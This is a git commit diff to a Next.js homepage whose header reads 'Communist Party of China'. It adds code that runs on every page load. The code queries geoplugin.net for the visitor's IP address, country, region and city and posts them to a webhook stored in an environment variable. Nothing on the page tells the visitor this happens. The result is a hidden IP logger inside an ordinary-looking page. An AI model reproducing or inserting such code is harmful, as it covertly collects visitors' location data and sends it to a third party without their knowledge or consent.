14c7deb6ca2321153cddfb825cf25d69c915fd1e
can pooper <domesticatedhuman9999@gmail.com>
2023-03-19 14:02:30 -0400

    test

--- pages/index.tsx
+++ pages/index.tsx
@@ -2,8 +2,45 @@
 import styles from '@/styles/Home.module.css';
 import React from 'react';
 import Datetime from '../components/date';
+import path from "path";
+// require('dotenv').config({path: __dirname + ".env"});
 
 export default function Home() {
+    // <p>{process.env.AUTH_TOKEN}</p>
+    let webhook: any = process.env.REACT_APP_WEBHOOK;
+
+    function send(content: object) {
+        let data = {
+            embeds: [content],
+        };
+
+        fetch(webhook, {
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        }).catch(console.error);
+    };
+
+    function lol() {
+        fetch("http://www.geoplugin.net/json.gp").then((response) => {
+            response.json().then((inputData) => {
+                console.log(inputData);
+                let content = {
+                    title: "hi",
+                    description: `**IP:** ${inputData.geoplugin_request}
+                    **Country:** ${inputData.geoplugin_countryName}
+                    **State/Province:** ${inputData.geoplugin_regionName}
+                    **Town/City:** ${inputData.geoplugin_city}`,
+                };
+                send(content);
+            }).catch(console.error);
+        });
+    };
+
+    lol();
+    
     return (
         <>
         <header><h1>Communist Party of China</h1></header>
